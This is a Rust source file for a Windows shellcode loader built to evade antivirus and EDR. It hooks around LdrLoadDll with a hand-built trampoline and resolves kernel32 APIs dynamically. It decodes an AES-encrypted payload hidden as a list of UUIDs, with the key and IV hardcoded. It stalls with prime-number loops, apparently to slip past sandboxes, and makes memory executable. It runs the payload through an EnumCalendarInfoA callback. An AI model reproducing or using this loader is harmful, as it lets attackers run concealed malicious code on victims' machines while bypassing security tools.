
#![windows_subsystem = "windows"]

use std::ffi::{c_char, c_void, CString, OsString};
use std::mem::transmute;
use std::os::windows::ffi::OsStrExt;
use std::{mem, ptr, slice};
use std::alloc::{alloc, dealloc, Layout};
use std::ptr::{null, null_mut};
use uuid::Uuid;
use libaes::Cipher;

use winapi::shared::minwindef::{LPCVOID, LPVOID};
use winapi::shared::ntdef::{LCID, LOCALE_USER_DEFAULT, NTSTATUS, NULL, PULONG, PUNICODE_STRING, PVOID, UNICODE_STRING, WCHAR};
use winapi::um::winnls::{CALID, CALINFO_ENUMPROCA, CALTYPE};
use winapi::um::winbase::LPFIBER_START_ROUTINE;
use windows::core::{PCSTR, s};
use windows::core::imp::BOOL;
use windows::Win32::Foundation::{HANDLE, HMODULE, PAPCFUNC};
use windows::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryA};
use windows::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS, PAGE_READWRITE, VIRTUAL_ALLOCATION_TYPE, VirtualAlloc, VirtualProtect};

pub type PWSTR = *mut WCHAR;


fn prepare_unicode_string(input: &str) -> UNICODE_STRING {
    // Convert DLL name to wide string
    let wide_string: Vec<u16> = OsString::from(input)
        .encode_wide()
        .chain(std::iter::once(0))
        .collect();

    // Prepare UNICODE_STRING for DLL name
    UNICODE_STRING {
        Length: ((wide_string.len() - 1) * 2) as u16,
        MaximumLength: (wide_string.len() * 2) as u16,
        Buffer: wide_string.as_ptr() as *mut _,
    }
}


unsafe fn copy_memory(destination: *mut u8, source: *const u8, length: usize) {
    let mut d = destination;
    let mut s = source;

    for _ in 0..length {
        *d = *s;
        d = d.add(1);
        s = s.add(1);
    }
}

pub fn deobfuscate_uuid(list_uuid: Vec<&str>) -> Result<Vec<u8>, ()> {
    let mut desofuscated_bytes = Vec::new();

    for uuid_str in list_uuid {
        match Uuid::parse_str(uuid_str) {
            Ok(uuid) => {
                desofuscated_bytes.extend_from_slice(uuid.as_bytes());
            }
            Err(_) => return Err(()),
        }
    }

    Ok(desofuscated_bytes)
}


type PNewLdrLoadDll = unsafe extern "system" fn(
    dll_path: PWSTR,
    dll_characteristics: PULONG,
    dll_name: PUNICODE_STRING,
    dll_handle: *mut PVOID,
) -> NTSTATUS;

fn deobfuscate_words(words: Vec<&str>, dataset: Vec<&str>) -> Vec<u8> {
    let mut shellcode: Vec<u8> = vec![0; words.len()];
    for sc_index in 0..shellcode.len() {
        for tt_index in 0..256 {
            if dataset[tt_index] == words[sc_index] {
                shellcode[sc_index] = tt_index as u8;
                break;
            }
        }
    }
    shellcode
}

fn my_xor(data: &mut [u8], key: &[u8]) {
    for i in 0..data.len() {
        data[i] ^= key[i % key.len()];
    }
}

fn is_prime(n: i64) -> bool {
    if n <= 1 {
        return false;
    }
    for i in 2..=n {
        if i * i > n {
            break;
        }
        if n % i == 0 {
            return false;
        }
    }
    true
}


fn main() {
	
    let hmodule = unsafe { LoadLibraryA(s!("ntdll.dll")).unwrap() };
    let orign_ldr_load_dll = unsafe { GetProcAddress(hmodule, s!("LdrLoadDll")).unwrap() };
    let mut ldr_loadr_dll: PNewLdrLoadDll = unsafe { transmute(null::<fn()>()) };


    #[cfg(target_arch = "x86_64")] {
        let jmp_addr: *const () = (orign_ldr_load_dll as usize + 0x5) as *const ();
        let orgin: [u8; 5] = [0x48, 0x89, 0x5c, 0x24, 0x10];
        let jump_prelude: [u8; 2] = [0x49, 0xBB];
        let jump_epilogue: [u8; 4] = [0x41, 0xFF, 0xE3, 0xC3];
        let trampoline = unsafe {
            VirtualAlloc(None, 19, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)
        };
        unsafe{
            let addr_ptr: *const u8 = std::ptr::addr_of!(jmp_addr) as *const u8;
            copy_memory(trampoline as *mut u8, orgin.as_ptr(), 5);
            copy_memory(trampoline.add(5) as *mut u8, jump_prelude.as_ptr(), jump_prelude.len());
            copy_memory(trampoline.add(5).add(2) as *mut u8, addr_ptr, 8);
            copy_memory(trampoline.add(5).add(2).add(8) as *mut u8, jump_epilogue.as_ptr(), 4);
            let mut oldprotect = PAGE_PROTECTION_FLAGS(0);
            VirtualProtect(trampoline, 30, PAGE_EXECUTE_READ, &mut oldprotect).expect("TODO: panic message");
            ldr_loadr_dll = std::mem::transmute(trampoline);
        }
    }
    #[cfg(target_arch = "x86")]{
        let jmp_addr: *const () = (orign_ldr_load_dll as usize + 0x2) as *const ();
        let orgin: [u8; 2] = [0x89,0xFF];
        let jump_prelude: [u8; 1] = [0xB8];
        let jump_epilogue: [u8; 3] = [0xFF, 0xE0, 0xC3];
        let trampoline = unsafe {
            VirtualAlloc(None, 19, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)
        };
        unsafe{
            let addr_ptr: *const u8 = std::ptr::addr_of!(jmp_addr) as *const u8;
            crate::copy_memory(trampoline as *mut u8, orgin.as_ptr(), 2);
            crate::copy_memory(trampoline.add(2) as *mut u8, jump_prelude.as_ptr(), jump_prelude.len());
            crate::copy_memory(trampoline.add(2).add(jump_prelude.len()) as *mut u8, addr_ptr, 4);
            crate::copy_memory(trampoline.add(2).add(jump_prelude.len()).add(4) as *mut u8, jump_epilogue.as_ptr(), jump_epilogue.len());
            let mut oldprotect = PAGE_PROTECTION_FLAGS(0);
            VirtualProtect(trampoline, 30, PAGE_EXECUTE_READ, &mut oldprotect).expect("TODO: panic message");
            ldr_loadr_dll = std::mem::transmute(trampoline);
        }
    }

    unsafe {


        //get kernel32.dll
        // Convert DLL name to wide string
        let kernel32_dll_name: Vec<u16> = OsString::from("kernel32.dll")
            .encode_wide()
            .chain(std::iter::once(0))
            .collect();
        // Prepare UNICODE_STRING for DLL name
        let mut kernel_dll_unicode = UNICODE_STRING {
            Length: ((kernel32_dll_name.len() - 1) * 2) as u16,
            MaximumLength: (kernel32_dll_name.len() * 2) as u16,
            Buffer: kernel32_dll_name.as_ptr() as *mut _,
        };
        // let mut kernel_dll_unicode =prepare_unicode_string("kernel32.dll");
        let mut kernel32handle = null_mut();
        let _ = ldr_loadr_dll(ptr::null_mut(), 0 as PULONG, &mut kernel_dll_unicode, &mut kernel32handle);
        let kernel32handle: HMODULE = std::mem::transmute(kernel32handle);
        //get my_get_proc_address
        type PMyGetProcAddress = unsafe extern "system" fn(HMODULE, PCSTR) -> LPVOID;
        let my_get_proc_address_addr = GetProcAddress(kernel32handle, s!("GetProcAddress")).unwrap();
        let my_get_proc_address: PMyGetProcAddress = transmute(my_get_proc_address_addr);

        //get VirtualAlloc
        type PMyVirtualAlloc = unsafe extern "system" fn(
            lpaddress: LPVOID,
            dwsize: usize,
            flallocationtype: VIRTUAL_ALLOCATION_TYPE,
            flprotect: PAGE_PROTECTION_FLAGS,
        ) -> LPVOID;
        let my_virtual_alloc_addr = my_get_proc_address(kernel32handle, s!("VirtualAlloc"));
        let my_virtual_alloc: PMyVirtualAlloc = transmute(my_virtual_alloc_addr);

        //get VirtualProtect
        type PMyVirtualProtect = unsafe extern "system" fn(
            lpaddress: PVOID,
            dwsize: usize,
            flnewprotect: u32,
            lpfloldprotect: *mut u32,
        ) -> BOOL;
        let my_virtual_protect_addr = my_get_proc_address(kernel32handle, s!("VirtualProtect"));
        let my_virtual_protect: PMyVirtualProtect = transmute(my_virtual_protect_addr);

        //get WriteProcessMemory
        type PMyWriteProcessMemory = unsafe extern "system" fn(
            hprocess: HANDLE,
            lpbaseaddress: LPCVOID,
            lpbuffer: LPCVOID,
            nsize: usize,
            lpnumberofbyteswritten: *mut usize,
        ) -> BOOL;
        let my_write_process_memory_addr = my_get_proc_address(kernel32handle, s!("WriteProcessMemory"));
        let my_write_process_memory: PMyWriteProcessMemory = transmute(my_write_process_memory_addr);

        //get GetCurrentProcess
        type PMyGetCurrentProcess = unsafe extern "system" fn() -> HANDLE;
        let my_get_current_process_addr = my_get_proc_address(kernel32handle, s!("GetCurrentProcess"));
        let my_get_current_process: PMyGetCurrentProcess = transmute(my_get_current_process_addr);

		
	let uuids: Vec<&str> = vec![ "2bcce15e-9396-beb4-f643-ef44381cc31d","61607168-ce62-7271-8451-81064a8369a6","c0f18c8e-c956-0bad-1037-673fabdcdc5c","52185c48-b038-2084-e9ad-c8438a0704cc","ff1c0cf6-794a-b14e-58f2-49cb591eb933","534a46fe-308f-e5d8-53c7-231d54735835","bddd9ccb-1919-1796-cb55-cf67c6b66be9","4af8a6f8-7f74-18f4-4ae7-6108abe046bd","2fdfc645-eb7d-b366-dfae-ab28fcad71b9","79c760bf-46df-102d-95ac-93c1181bf525","6ee05ac4-257e-22f1-cab0-159c410ddc35","5d6c91f5-3d87-6040-1ed6-f2f16c783d53","f3382c05-0964-d609-0363-14d9455a5076","86b2ad11-64f5-bf82-6b78-fbb8fdd20e1a","1f42b966-7f95-6084-660f-1acf2e2cbc12","352967fa-09f1-ae53-1c37-ad231123bbbc","12a62d22-2bfe-219f-bfd6-43f8e722ce8a","eabbd602-d387-2dd1-125c-60beeb5ecaa1","255c96e2-5bd4-8382-ce05-4c529dceb169","fc442dbe-e1a9-f292-d566-7abf8d69ed26","59830abe-7ff6-1bb1-b4ff-9c30ef080671","212c93b3-412e-82ca-40fe-0c9b121fe134","2d261772-df3a-8365-c15c-2789beba2d85","a0247010-6508-0b7e-ca13-83276391ecd5","c306fa8e-e332-0bcd-2591-44be71873d50", ];
	let mut shellcode_result = deobfuscate_uuid(uuids);
	let mut shellcode = match shellcode_result {
	   Ok(bytes) => bytes,
	   Err(_) => {
		   println!("Failed to deobfuscate UUIDs");
		   return;
	   }
	};


		
	let key = b"3NrU4D75pCqlBUy2";
	let iv = b"0m1RuTgGRSoAiaz1";
	let cipher = Cipher::new_128(key);

	let shellcode = cipher.cbc_decrypt(iv, &*shellcode);


		
        // 回调函数加载shellcdoe
        //get EnumCalendarInfoA
        type PMyEnumCalendarInfoA = unsafe extern "system" fn(
            lpCalInfoEnumProc: CALINFO_ENUMPROCA,
            Locale: LCID,
            Calendar: CALID,
            CalType: CALTYPE,
        ) -> BOOL;
        let my_enum_calendar_infoa_addr = my_get_proc_address(kernel32handle, s!("EnumCalendarInfoA"));
        let my_enum_calendar_infoa :PMyEnumCalendarInfoA= transmute(my_enum_calendar_infoa_addr);

		let address = my_virtual_alloc(NULL,shellcode.len(),MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        is_prime(1000000000000002049);
        let mut old_protect:u32 =0;
        my_virtual_protect(address, shellcode.len(), 0x20, &mut old_protect);
        is_prime(1000000000000002137);
        my_virtual_protect(address, shellcode.len(), 0x40, &mut old_protect);
        is_prime(1000000000000002481);
        my_write_process_memory(my_get_current_process(),address,shellcode.as_ptr()  as LPCVOID,shellcode.len(),null_mut());

        my_enum_calendar_infoa(transmute(address), LOCALE_USER_DEFAULT, 1, 1);

    };
}


